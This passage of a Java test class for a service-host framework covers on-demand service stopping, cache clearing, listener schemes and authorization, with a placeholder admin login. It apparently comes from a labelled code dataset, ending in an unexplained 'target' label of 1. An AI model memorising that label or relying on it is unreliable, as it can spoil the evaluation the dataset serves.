setUp(true);\n\n        long maintenanceIntervalMillis = 100;\n        long maintenanceIntervalMicros = TimeUnit.MILLISECONDS\n                .toMicros(maintenanceIntervalMillis);\n\n        // induce host to clear service state cache by setting mem limit low\n        this.host.setMaintenanceIntervalMicros(maintenanceIntervalMicros);\n        this.host.setServiceCacheClearDelayMicros(maintenanceIntervalMicros / 2);\n        this.host.start();\n\n        EnumSet<ServiceOption> caps = EnumSet.of(ServiceOption.PERSISTENCE,\n                ServiceOption.INSTRUMENTATION, ServiceOption.ON_DEMAND_LOAD, ServiceOption.FACTORY_ITEM);\n\n        // Start the factory service. it will be needed to start services on-demand\n        MinimalFactoryTestService factoryService = new MinimalFactoryTestService();\n        factoryService.setChildServiceCaps(caps);\n        this.host.startServiceAndWait(factoryService, \"service\", null);\n\n        // Start some test services with ServiceOption.ON_DEMAND_LOAD\n        List<Service> services = this.host.doThroughputServiceStart(this.serviceCount,\n                MinimalTestService.class, this.host.buildMinimalTestState(), caps, null);\n        List<URI> statsUris = new ArrayList<>();\n        for (Service s : services) {\n            statsUris.add(UriUtils.buildStatsUri(s.getUri()));\n        }\n\n        // guarantee at least a few maintenance intervals have passed.\n        Thread.sleep(maintenanceIntervalMillis * 10);\n\n        // Let's verify now that all of the services have stopped by now.\n        this.host.waitFor(\n                \"Service stats did not get updated\",\n                () -> {\n                    int pausedCount = 0;\n\n                    Map<URI, ServiceStats> allStats = this.host.getServiceState(null,\n                            ServiceStats.class, statsUris);\n                    for (ServiceStats sStats : allStats.values()) {\n                        ServiceStat pauseStat = sStats.entries.get(Service.STAT_NAME_PAUSE_COUNT);\n                        if (pauseStat != null && pauseStat.latestValue > 0) {\n                            pausedCount++;\n                        }\n                    }\n\n                    if (pausedCount < this.serviceCount) {\n                        this.host.log(\"Paused Count %d is less than expected %d\", pausedCount,\n                                this.serviceCount);\n                        return false;\n                    }\n\n                    Map<String, ServiceStat> stats = this.host.getServiceStats(this.host\n                            .getManagementServiceUri());\n\n                    ServiceStat odlCacheClears = stats\n                            .get(ServiceHostManagementService.STAT_NAME_ODL_CACHE_CLEAR_COUNT);\n                    if (odlCacheClears == null || odlCacheClears.latestValue < this.serviceCount) {\n                        this.host.log(\n                                \"ODL Service Cache Clears %s were less than expected %d\",\n                                odlCacheClears == null ? \"null\" : String\n                                        .valueOf(odlCacheClears.latestValue),\n                                this.serviceCount);\n                        return false;\n                    }\n\n                    ServiceStat cacheClears = stats\n                            .get(ServiceHostManagementService.STAT_NAME_SERVICE_CACHE_CLEAR_COUNT);\n                    if (cacheClears == null || cacheClears.latestValue < this.serviceCount) {\n                        this.host.log(\n                                \"Service Cache Clears %s were less than expected %d\",\n                                cacheClears == null ? \"null\" : String\n                                        .valueOf(cacheClears.latestValue),\n                                this.serviceCount);\n                        return false;\n                    }\n\n                    return true;\n                });\n    }\n\n    private void patchExampleServices(Map<URI, ExampleServiceState> states, int count)\n            throws Throwable {\n        TestContext ctx = this.host.testCreate(states.size() * count);\n        for (ExampleServiceState st : states.values()) {\n            for (int i = 0; i < count; i++) {\n                st.name = \"updated\" + Utils.getNowMicrosUtc() + \"\";\n                Operation patch = Operation\n                        .createPatch(UriUtils.buildUri(this.host, st.documentSelfLink))\n                        .setCompletion((o, e) -> {\n                            if (e != null) {\n                                logPausedFiles();\n                                ctx.fail(e);\n                                return;\n                            }\n                            ctx.complete();\n                        }).setBody(st);\n                this.host.send(patch);\n            }\n        }\n        this.host.testWait(ctx);\n    }\n\n    private void logPausedFiles() {\n        File sandBox = new File(this.host.getStorageSandbox());\n        File serviceContextIndex = new File(sandBox, ServiceContextIndexService.FILE_PATH);\n        try {\n            Files.list(serviceContextIndex.toPath()).forEach((p) -> {\n                this.host.log(\"%s\", p);\n            });\n        } catch (IOException e) {\n            this.host.log(Level.WARNING, \"%s\", Utils.toString(e));\n        }\n    }\n\n    @Test\n    public void onDemandServiceStopCheckWithReadAndWriteAccess() throws Throwable {\n        for (int i = 0; i < this.iterationCount; i++) {\n            tearDown();\n            doOnDemandServiceStopCheckWithReadAndWriteAccess();\n        }\n    }\n\n    private void doOnDemandServiceStopCheckWithReadAndWriteAccess() throws Throwable {\n        setUp(true);\n\n        long maintenanceIntervalMicros = TimeUnit.MILLISECONDS.toMicros(100);\n\n        // induce host to stop ON_DEMAND_SERVICE more often by setting maintenance interval short\n        this.host.setMaintenanceIntervalMicros(maintenanceIntervalMicros);\n        this.host.setServiceCacheClearDelayMicros(maintenanceIntervalMicros / 2);\n        this.host.start();\n\n        // Start some test services with ServiceOption.ON_DEMAND_LOAD\n        EnumSet<ServiceOption> caps = EnumSet.of(ServiceOption.PERSISTENCE,\n                ServiceOption.ON_DEMAND_LOAD,\n                ServiceOption.FACTORY_ITEM);\n\n        MinimalFactoryTestService factoryService = new MinimalFactoryTestService();\n        factoryService.setChildServiceCaps(caps);\n        this.host.startServiceAndWait(factoryService, \"/service\", null);\n\n        final double stopCount = getODLStopCountStat() != null ? getODLStopCountStat().latestValue : 0;\n\n        // Test DELETE works on ODL service as it works on non-ODL service.\n        // Delete on non-existent service should fail, and should not leave any side effects behind.\n        Operation deleteOp = Operation.createDelete(this.host, \"/service/foo\")\n                .setBody(new ServiceDocument());\n\n        this.host.sendAndWaitExpectFailure(deleteOp);\n\n        // create a ON_DEMAND_LOAD service\n        MinimalTestServiceState initialState = new MinimalTestServiceState();\n        initialState.id = \"foo\";\n        initialState.documentSelfLink = \"/foo\";\n        Operation startPost = Operation\n                .createPost(UriUtils.buildUri(this.host, \"/service\"))\n                .setBody(initialState);\n        this.host.sendAndWaitExpectSuccess(startPost);\n\n        String servicePath = \"/service/foo\";\n\n        // wait for the service to be stopped and stat to be populated\n        // This also verifies that ON_DEMAND_LOAD service will stop while it is idle for some duration\n        this.host.waitFor(\"Waiting ON_DEMAND_LOAD service to be stopped\",\n                () -> this.host.getServiceStage(servicePath) == null\n                        && getODLStopCountStat() != null\n                        && getODLStopCountStat().latestValue > stopCount\n        );\n        long lastODLStopTime = getODLStopCountStat().lastUpdateMicrosUtc;\n\n        int requestCount = 10;\n        int requestDelayMills = 40;\n\n        // Keep the time right before sending the last request.\n        // Use this time to check the service was not stopped at this moment. Since we keep\n        // sending the request with 40ms apart, when last request has sent, service should not\n        // be stopped(within maintenance window and cacheclear delay).\n        long beforeLastRequestSentTime = 0;\n\n        // send 10 GET request 40ms apart to make service receive GET request during a couple\n        // of maintenance windows\n        TestContext testContextForGet = this.host.testCreate(requestCount);\n        for (int i = 0; i < requestCount; i++) {\n            Operation get = Operation\n                    .createGet(this.host, servicePath)\n                    .setCompletion(testContextForGet.getCompletion());\n            beforeLastRequestSentTime = Utils.getNowMicrosUtc();\n            this.host.send(get);\n            Thread.sleep(requestDelayMills);\n        }\n        testContextForGet.await();\n\n        // wait for the service to be stopped\n        final long beforeLastGetSentTime = beforeLastRequestSentTime;\n        this.host.waitFor(\"Waiting ON_DEMAND_LOAD service to be stopped\",\n                () -> {\n                    long currentStopTime = getODLStopCountStat().lastUpdateMicrosUtc;\n                    return lastODLStopTime < currentStopTime\n                            && beforeLastGetSentTime < currentStopTime\n                            && this.host.getServiceStage(servicePath) == null;\n                }\n        );\n\n        long afterGetODLStopTime = getODLStopCountStat().lastUpdateMicrosUtc;\n\n        // send 10 update request 40ms apart to make service receive PATCH request during a couple\n        // of maintenance windows\n        TestContext ctx = this.host.testCreate(requestCount);\n        for (int i = 0; i < requestCount; i++) {\n            Operation patch = createMinimalTestServicePatch(servicePath, ctx);\n            beforeLastRequestSentTime = Utils.getNowMicrosUtc();\n            this.host.send(patch);\n            Thread.sleep(requestDelayMills);\n        }\n        ctx.await();\n\n        // wait for the service to be stopped\n        final long beforeLastPatchSentTime = beforeLastRequestSentTime;\n        this.host.waitFor(\"Waiting ON_DEMAND_LOAD service to be stopped\",\n                () -> {\n                    long currentStopTime = getODLStopCountStat().lastUpdateMicrosUtc;\n                    return afterGetODLStopTime < currentStopTime\n                            && beforeLastPatchSentTime < currentStopTime\n                            && this.host.getServiceStage(servicePath) == null;\n                }\n        );\n\n        double maintCount = getHostMaintenanceCount();\n        // issue multiple PATCHs while directly stopping a ODL service to induce collision\n        // of stop with active requests. First prevent automatic stop of ODL by extending\n        // cache clear time\n        this.host.setServiceCacheClearDelayMicros(TimeUnit.DAYS.toMicros(1));\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > maintCount + 1;\n        });\n\n\n        // first cause a on demand load (start)\n        Operation patch = createMinimalTestServicePatch(servicePath, null);\n        this.host.sendAndWaitExpectSuccess(patch);\n\n        assertTrue(this.host.getServiceStage(servicePath) == ProcessingStage.AVAILABLE);\n\n        requestCount = this.requestCount;\n        // service is started. issue updates in parallel and then stop service while requests are\n        // still being issued\n        ctx = this.host.testCreate(requestCount);\n        for (int i = 0; i < requestCount; i++) {\n            patch = createMinimalTestServicePatch(servicePath, ctx);\n            this.host.send(patch);\n            if (i == Math.min(10, requestCount / 2)) {\n                Operation deleteStop = Operation.createDelete(this.host, servicePath)\n                        .addPragmaDirective(Operation.PRAGMA_DIRECTIVE_NO_INDEX_UPDATE);\n                this.host.send(deleteStop);\n            }\n        }\n        ctx.await();\n\n        verifyOnDemandLoadUpdateDeleteContention();\n    }\n\n    void verifyOnDemandLoadUpdateDeleteContention() throws Throwable {\n        Operation patch;\n        Consumer<Operation> bodySetter = (o) -> {\n            ExampleServiceState body = new ExampleServiceState();\n            body.name = \"prefix-\" + UUID.randomUUID();\n            o.setBody(body);\n        };\n        String factoryLink = OnDemandLoadFactoryService.create(this.host);\n\n        // before we start service attempt a GET on a ODL service we know does not\n        // exist. Make sure its handleStart is NOT called (we will fail the POST if handleStart\n        // is called, with no body)\n\n        Operation get = Operation.createGet(UriUtils.buildUri(\n                this.host, UriUtils.buildUriPath(factoryLink, \"does-not-exist\")));\n        this.host.sendAndWaitExpectFailure(get, Operation.STATUS_CODE_NOT_FOUND);\n\n        // create another set of services\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(\n                null,\n                this.serviceCount,\n                ExampleServiceState.class,\n                bodySetter,\n                UriUtils.buildUri(this.host, factoryLink));\n\n        // set aggressive cache clear again so ODL services stop\n        double nowCount = getHostMaintenanceCount();\n        this.host.setServiceCacheClearDelayMicros(this.host.getMaintenanceIntervalMicros() / 2);\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > nowCount + 1;\n        });\n\n        // now patch these services, while we issue deletes. The PATCHs can fail, but not\n        // the DELETEs\n        TestContext patchAndDeleteCtx = this.host.testCreate(states.size() * 2);\n        patchAndDeleteCtx.setTestName(\"Concurrent PATCH / DELETE on ODL\").logBefore();\n        for (Entry<URI, ExampleServiceState> e : states.entrySet()) {\n            patch = Operation.createPatch(e.getKey())\n                    .setBody(e.getValue())\n                    .setCompletion((o, ex) -> {\n                        patchAndDeleteCtx.complete();\n                    });\n            this.host.send(patch);\n            // in parallel send a DELETE\n            this.host.send(Operation.createDelete(e.getKey())\n                    .setCompletion(patchAndDeleteCtx.getCompletion()));\n        }\n        patchAndDeleteCtx.await();\n        patchAndDeleteCtx.logAfter();\n    }\n\n    double getHostMaintenanceCount() {\n        Map<String, ServiceStat> hostStats = this.host.getServiceStats(\n                UriUtils.buildUri(this.host, ServiceHostManagementService.SELF_LINK));\n        ServiceStat stat = hostStats.get(Service.STAT_NAME_SERVICE_HOST_MAINTENANCE_COUNT);\n        if (stat == null) {\n            return 0.0;\n        }\n        return stat.latestValue;\n    }\n\n    Operation createMinimalTestServicePatch(String servicePath, TestContext ctx) {\n        MinimalTestServiceState body = new MinimalTestServiceState();\n        body.id = Utils.buildUUID(\"foo\");\n        Operation patch = Operation\n                .createPatch(UriUtils.buildUri(this.host, servicePath))\n                .setBody(body);\n        if (ctx != null) {\n            patch.setCompletion(ctx.getCompletion());\n        }\n        return patch;\n    }\n\n    @Test\n    public void onDemandLoadServicePauseWithSubscribersAndStats() throws Throwable {\n        setUp(false);\n        // Set memory limit very low to induce service pause/stop.\n        this.host.setServiceMemoryLimit(ServiceHost.ROOT_PATH, 0.00001);\n\n        // Increase the maintenance interval to delay service pause/ stop.\n        this.host.setMaintenanceIntervalMicros(TimeUnit.SECONDS.toMicros(5));\n\n        Consumer<Operation> bodySetter = (o) -> {\n            ExampleServiceState body = new ExampleServiceState();\n            body.name = \"prefix-\" + UUID.randomUUID();\n            o.setBody(body);\n        };\n\n        // Create one OnDemandLoad Services\n        String factoryLink = OnDemandLoadFactoryService.create(this.host);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(\n                null,\n                this.serviceCount,\n                ExampleServiceState.class,\n                bodySetter,\n                UriUtils.buildUri(this.host, factoryLink));\n\n        TestContext ctx = this.host.testCreate(this.serviceCount);\n        TestContext notifyCtx = this.host.testCreate(this.serviceCount * 2);\n        notifyCtx.setTestName(\"notifications\");\n\n        // Subscribe to created services\n        ctx.setTestName(\"Subscriptions\").logBefore();\n        for (URI serviceUri : states.keySet()) {\n            Operation subscribe = Operation.createPost(serviceUri)\n                    .setCompletion(ctx.getCompletion())\n                    .setReferer(this.host.getReferer());\n\n            this.host.startReliableSubscriptionService(subscribe, (notifyOp) -> {\n                notifyOp.complete();\n                notifyCtx.completeIteration();\n            });\n        }\n        this.host.testWait(ctx);\n        ctx.logAfter();\n\n        TestContext firstPatchCtx = this.host.testCreate(this.serviceCount);\n        firstPatchCtx.setTestName(\"Initial patch\").logBefore();\n        // do a PATCH, to trigger a notification\n        for (URI serviceUri : states.keySet()) {\n            ExampleServiceState st = new ExampleServiceState();\n            st.name = \"firstPatch\";\n            Operation patch = Operation\n                    .createPatch(serviceUri)\n                    .setBody(st)\n                    .setCompletion(firstPatchCtx.getCompletion());\n            this.host.send(patch);\n        }\n        this.host.testWait(firstPatchCtx);\n        firstPatchCtx.logAfter();\n\n        // Let's change the maintenance interval to low so that the service pauses.\n        this.host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(100));\n\n        this.host.log(\"Waiting for service pauses after reduced maint. interval\");\n        // Wait for the service to get paused.\n        this.host.waitFor(\"Service failed to pause\",\n                () -> {\n                    for (URI uri : states.keySet()) {\n                        if (this.host.getServiceStage(uri.getPath()) != null) {\n                            return false;\n                        }\n                    }\n                    return true;\n                });\n\n        // do a PATCH, after pause, to trigger a resume and another notification\n        TestContext patchCtx = this.host.testCreate(this.serviceCount);\n        patchCtx.setTestName(\"second patch, post pause\").logBefore();\n        for (URI serviceUri : states.keySet()) {\n            ExampleServiceState st = new ExampleServiceState();\n            st.name = \"firstPatch\";\n\n            Operation patch = Operation\n                    .createPatch(serviceUri)\n                    .setBody(st)\n                    .setCompletion(patchCtx.getCompletion());\n            this.host.send(patch);\n        }\n\n        // wait for PATCHs\n        this.host.testWait(patchCtx);\n        patchCtx.logAfter();\n\n        // Wait for all the patch notifications. This will exit only\n        // when both notifications have been received.\n        notifyCtx.logBefore();\n        this.host.testWait(notifyCtx);\n    }\n\n    private ServiceStat getODLStopCountStat() throws Throwable {\n        URI managementServiceUri = this.host.getManagementServiceUri();\n        return this.host.getServiceStats(managementServiceUri)\n                .get(ServiceHostManagementService.STAT_NAME_ODL_STOP_COUNT);\n    }\n\n    private ServiceStat getRateLimitOpCountStat() throws Throwable {\n        URI managementServiceUri = this.host.getManagementServiceUri();\n        return this.host.getServiceStats(managementServiceUri)\n                .get(ServiceHostManagementService.STAT_NAME_RATE_LIMITED_OP_COUNT);\n    }\n\n    @Test\n    public void thirdPartyClientPost() throws Throwable {\n        setUp(false);\n        this.host.waitForServiceAvailable(ExampleService.FACTORY_LINK);\n\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        long c = 1;\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, c,\n                ExampleServiceState.class, bodySetter, factoryURI);\n\n        String contentType = Operation.MEDIA_TYPE_APPLICATION_JSON;\n        for (ExampleServiceState initialState : states.values()) {\n            String json = this.host.sendWithJavaClient(\n                    UriUtils.buildUri(this.host, initialState.documentSelfLink), contentType, null);\n            ExampleServiceState javaClientRsp = Utils.fromJson(json, ExampleServiceState.class);\n            assertTrue(javaClientRsp.name.equals(initialState.name));\n        }\n\n        // Now issue POST with third party client\n        s.name = UUID.randomUUID().toString();\n        String body = Utils.toJson(s);\n        // first use proper content type\n        String json = this.host.sendWithJavaClient(factoryURI,\n                Operation.MEDIA_TYPE_APPLICATION_JSON, body);\n        ExampleServiceState javaClientRsp = Utils.fromJson(json, ExampleServiceState.class);\n        assertTrue(javaClientRsp.name.equals(s.name));\n\n        // POST to a service we know does not exist and verify our request did not get implicitly\n        // queued, but failed instantly instead\n\n        json = this.host.sendWithJavaClient(\n                UriUtils.extendUri(factoryURI, UUID.randomUUID().toString()),\n                Operation.MEDIA_TYPE_APPLICATION_JSON, null);\n\n        ServiceErrorResponse r = Utils.fromJson(json, ServiceErrorResponse.class);\n        assertEquals(Operation.STATUS_CODE_NOT_FOUND, r.statusCode);\n    }\n\n    private URI[] buildStatsUris(long serviceCount, List<Service> services) {\n        URI[] statUris = new URI[(int) serviceCount];\n        int i = 0;\n        for (Service s : services) {\n            statUris[i++] = UriUtils.extendUri(s.getUri(),\n                    ServiceHost.SERVICE_URI_SUFFIX_STATS);\n        }\n        return statUris;\n    }\n\n    @Test\n    public void getAvailableServicesWithOptions() throws Throwable {\n        setUp(false);\n        int serviceCount = 5;\n        this.host.createExampleServices(this.host, serviceCount, Utils.getNowMicrosUtc());\n\n        EnumSet<ServiceOption> options = EnumSet.of(ServiceOption.INSTRUMENTATION,\n                ServiceOption.OWNER_SELECTION, ServiceOption.FACTORY_ITEM);\n\n        Operation get = Operation.createGet(this.host.getUri());\n        final ServiceDocumentQueryResult[] results = new ServiceDocumentQueryResult[1];\n\n        get.setCompletion((o, e) -> {\n            if (e != null) {\n                this.host.failIteration(e);\n                return;\n            }\n            results[0] = o.getBody(ServiceDocumentQueryResult.class);\n            this.host.completeIteration();\n        });\n\n        this.host.testStart(1);\n        this.host.queryServiceUris(options, true, get.clone());\n        this.host.testWait();\n        assertEquals(serviceCount, results[0].documentLinks.size());\n        this.host.testStart(1);\n        this.host.queryServiceUris(options, false, get.clone());\n        this.host.testWait();\n        assertTrue(results[0].documentLinks.size() >= serviceCount);\n    }\n\n    /**\n     * This test verify the custom Ui path resource of service\n     **/\n    @Test\n    public void testServiceCustomUIPath() throws Throwable {\n        setUp(false);\n        String resourcePath = \"customUiPath\";\n        // Service with custom path\n        class CustomUiPathService extends StatelessService {\n            public static final String SELF_LINK = \"/custom\";\n\n            public CustomUiPathService() {\n                super();\n                toggleOption(ServiceOption.HTML_USER_INTERFACE, true);\n            }\n\n            @Override\n            public ServiceDocument getDocumentTemplate() {\n                ServiceDocument serviceDocument = new ServiceDocument();\n                serviceDocument.documentDescription = new ServiceDocumentDescription();\n                serviceDocument.documentDescription.userInterfaceResourcePath = resourcePath;\n                return serviceDocument;\n            }\n        }\n\n        // Starting the  CustomUiPathService service\n        this.host.startServiceAndWait(new CustomUiPathService(), CustomUiPathService.SELF_LINK, null);\n\n        String htmlPath = \"/user-interface/resources/\" + resourcePath + \"/custom.html\";\n        // Sending get request for html\n        String htmlResponse = this.host.sendWithJavaClient(\n                UriUtils.buildUri(this.host, htmlPath),\n                Operation.MEDIA_TYPE_TEXT_HTML, null);\n\n        assertEquals(\"<html>customHtml</html>\", htmlResponse);\n    }\n\n    @Test\n    public void testRootUiService() throws Throwable {\n        setUp(false);\n\n        // Stopping the RootNamespaceService\n        this.host.waitForResponse(Operation\n                .createDelete(UriUtils.buildUri(this.host, UriUtils.URI_PATH_CHAR)));\n\n        class RootUiService extends UiFileContentService {\n            public static final String SELF_LINK = UriUtils.URI_PATH_CHAR;\n        }\n\n        // Starting the CustomUiService service\n        this.host.startServiceAndWait(new RootUiService(), RootUiService.SELF_LINK, null);\n\n        // Loading the default page\n        Operation result = this.host.waitForResponse(Operation\n                .createGet(UriUtils.buildUri(this.host, RootUiService.SELF_LINK)));\n        assertEquals(\"<html><title>Root</title></html>\", result.getBodyRaw());\n    }\n\n    @Test\n    public void testClientSideRouting() throws Throwable {\n        setUp(false);\n\n        class AppUiService extends UiFileContentService {\n            public static final String SELF_LINK = \"/app\";\n        }\n\n        // Starting the AppUiService service\n        AppUiService s = new AppUiService();\n        this.host.startServiceAndWait(s, AppUiService.SELF_LINK, null);\n\n        // Finding the default page file\n        Path baseResourcePath = Utils.getServiceUiResourcePath(s);\n        Path baseUriPath = Paths.get(AppUiService.SELF_LINK);\n        String prefix = baseResourcePath.toString().replace('\\\\', '/');\n        Map<Path, String> pathToURIPath = new HashMap<>();\n        this.host.discoverJarResources(baseResourcePath, s, pathToURIPath, baseUriPath, prefix);\n        File defaultFile = pathToURIPath.entrySet()\n                .stream()\n                .filter((entry) -> {\n                    return entry.getValue().equals(AppUiService.SELF_LINK +\n                            UriUtils.URI_PATH_CHAR + ServiceUriPaths.UI_RESOURCE_DEFAULT_FILE);\n                })\n                .map(Map.Entry::getKey)\n                .findFirst()\n                .get()\n                .toFile();\n\n        List<String> routes = Arrays.asList(\"/app/1\", \"/app/2\");\n\n        // Starting all route services\n        for (String route : routes) {\n            this.host.startServiceAndWait(new FileContentService(defaultFile), route, null);\n        }\n\n        // Loading routes\n        for (String route : routes) {\n            Operation result = this.host.waitForResponse(Operation\n                    .createGet(UriUtils.buildUri(this.host, route)));\n            assertEquals(\"<html><title>App</title></html>\", result.getBodyRaw());\n        }\n\n        // Loading the about page\n        Operation about = this.host.waitForResponse(Operation\n                .createGet(UriUtils.buildUri(this.host, AppUiService.SELF_LINK + \"/about.html\")));\n        assertEquals(\"<html><title>About</title></html>\", about.getBodyRaw());\n    }\n\n    @Test\n    public void httpScheme() throws Throwable {\n        setUp(true);\n\n        // SSL config for https\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        this.host.setCertificateFileReference(ssc.certificate().toURI());\n        this.host.setPrivateKeyFileReference(ssc.privateKey().toURI());\n\n        assertEquals(\"before starting, scheme is NONE\", ServiceHost.HttpScheme.NONE,\n                this.host.getCurrentHttpScheme());\n\n        this.host.setPort(0);\n        this.host.setSecurePort(0);\n        this.host.start();\n\n        ServiceRequestListener httpListener = this.host.getListener();\n        ServiceRequestListener httpsListener = this.host.getSecureListener();\n\n        assertTrue(\"http listener should be on\", httpListener.isListening());\n        assertTrue(\"https listener should be on\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.HTTP_AND_HTTPS, this.host.getCurrentHttpScheme());\n        assertTrue(\"public uri scheme should be HTTP\",\n                this.host.getPublicUri().getScheme().equals(\"http\"));\n\n        httpsListener.stop();\n        assertTrue(\"http listener should be on \", httpListener.isListening());\n        assertFalse(\"https listener should be off\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.HTTP_ONLY, this.host.getCurrentHttpScheme());\n        assertTrue(\"public uri scheme should be HTTP\",\n                this.host.getPublicUri().getScheme().equals(\"http\"));\n\n        httpListener.stop();\n        assertFalse(\"http listener should be off\", httpListener.isListening());\n        assertFalse(\"https listener should be off\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.NONE, this.host.getCurrentHttpScheme());\n\n        // re-start listener even host is stopped, verify getCurrentHttpScheme only\n        httpsListener.start(0, ServiceHost.LOOPBACK_ADDRESS);\n        assertFalse(\"http listener should be off\", httpListener.isListening());\n        assertTrue(\"https listener should be on\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.HTTPS_ONLY, this.host.getCurrentHttpScheme());\n        httpsListener.stop();\n\n        this.host.stop();\n        // set HTTP port to disabled, restart host. Verify scheme is HTTPS only. We must\n        // set both HTTP and secure port, to null out the listeners from the host instance.\n        this.host.setPort(ServiceHost.PORT_VALUE_LISTENER_DISABLED);\n        this.host.setSecurePort(0);\n        VerificationHost.createAndAttachSSLClient(this.host);\n        this.host.start();\n\n        httpListener = this.host.getListener();\n        httpsListener = this.host.getSecureListener();\n\n        assertTrue(\"http listener should be null, default port value set to disabled\",\n                httpListener == null);\n        assertTrue(\"https listener should be on\", httpsListener.isListening());\n        assertEquals(ServiceHost.HttpScheme.HTTPS_ONLY, this.host.getCurrentHttpScheme());\n        assertTrue(\"public uri scheme should be HTTPS\",\n                this.host.getPublicUri().getScheme().equals(\"https\"));\n    }\n\n    @Test\n    public void create() throws Throwable {\n        ServiceHost h = ServiceHost.create(\"--port=0\");\n        try {\n            h.start();\n            h.startDefaultCoreServicesSynchronously();\n\n            // Start the example service factory\n            h.startFactory(ExampleService.class, ExampleService::createFactory);\n\n            boolean[] isReady = new boolean[1];\n            h.registerForServiceAvailability((o, e) -> {\n                isReady[0] = true;\n            }, ExampleService.FACTORY_LINK);\n\n\n            Duration timeout = Duration.of(ServiceHost.ServiceHostState.DEFAULT_MAINTENANCE_INTERVAL_MICROS * 5, ChronoUnit.MICROS);\n            TestContext.waitFor(timeout, () -> {\n                return isReady[0];\n            }, \"ExampleService did not start\");\n\n            // verify ExampleService exists\n            TestRequestSender sender = new TestRequestSender(h);\n            Operation get = Operation.createGet(h, ExampleService.FACTORY_LINK);\n            sender.sendAndWait(get);\n        } finally {\n            if (h != null) {\n                h.unregisterRuntimeShutdownHook();\n                h.stop();\n            }\n        }\n    }\n\n    @Test\n    public void restartAndVerifyManagementService() throws Throwable {\n        setUp(false);\n\n        // management service should be accessible\n        Operation get = Operation.createGet(this.host, ServiceUriPaths.CORE_MANAGEMENT);\n        this.host.getTestRequestSender().sendAndWait(get);\n\n        // restart\n        this.host.stop();\n        this.host.setPort(0);\n        this.host.start();\n\n        // verify management service is accessible.\n        get = Operation.createGet(this.host, ServiceUriPaths.CORE_MANAGEMENT);\n        this.host.getTestRequestSender().sendAndWait(get);\n    }\n\n    @After\n    public void tearDown() throws IOException {\n        LuceneDocumentIndexService.setIndexFileCountThresholdForWriterRefresh(\n                LuceneDocumentIndexService\n                        .DEFAULT_INDEX_FILE_COUNT_THRESHOLD_FOR_WRITER_REFRESH);\n\n        if (this.host == null) {\n            return;\n        }\n\n        deletePausedFiles();\n        this.host.tearDown();\n    }\n\n\n    @Test\n    public void authorizeRequestOnOwnerSelectionService() throws Throwable {\n        setUp(true);\n\n        this.host.setAuthorizationService(new AuthorizationContextService());\n        this.host.setAuthorizationEnabled(true);\n        this.host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(100));\n        this.host.start();\n\n        AuthTestUtils.setSystemAuthorizationContext(this.host);\n\n        // Start Statefull with Non-Persisted service\n        this.host.startFactory(new AuthCheckService());\n        this.host.waitForServiceAvailable(AuthCheckService.FACTORY_LINK);\n\n        TestRequestSender sender = this.host.getTestRequestSender();\n\n\n        this.host.setSystemAuthorizationContext();\n\n        String adminUser = \"admin@vmware.com\";\n        String adminPass = \"password\";\n        TestContext authCtx = this.host.testCreate(1);\n        AuthorizationSetupHelper.create()\n                .setHost(this.host)\n                .setUserEmail(adminUser)\n                .setUserPassword(adminPass)\n                .setIsAdmin(true)\n                .setCompletion(authCtx.getCompletion())\n                .start();\n        authCtx.await();\n\n        // create foo\n        ExampleServiceState exampleFoo = new ExampleServiceState();\n        exampleFoo.name = \"foo\";\n        exampleFoo.documentSelfLink = \"foo\";\n\n        Operation post = Operation.createPost(this.host, AuthCheckService.FACTORY_LINK).setBody(exampleFoo);\n        ExampleServiceState postResult = sender.sendAndWait(post, ExampleServiceState.class);\n\n        URI statsUri = UriUtils.buildUri(this.host, postResult.documentSelfLink);\n\n        ServiceStats stats = sender.sendStatsGetAndWait(statsUri);\n        assertFalse(stats.entries.containsKey(AuthCheckService.IS_AUTHORIZE_REQUEST_CALLED));\n\n        this.host.resetAuthorizationContext();\n\n        TestRequestSender.FailureResponse failureResponse = sender.sendAndWaitFailure(Operation.createGet(this.host, postResult.documentSelfLink));\n        assertEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n\n        this.host.setSystemAuthorizationContext();\n\n        stats = sender.sendStatsGetAndWait(statsUri);\n        ServiceStat stat = stats.entries.get(AuthCheckService.IS_AUTHORIZE_REQUEST_CALLED);\n        assertNotNull(stat);\n        assertEquals(1, stat.latestValue, 0);\n\n        this.host.resetAuthorizationContext();\n\n    }\n\n}\n", "target": 1}
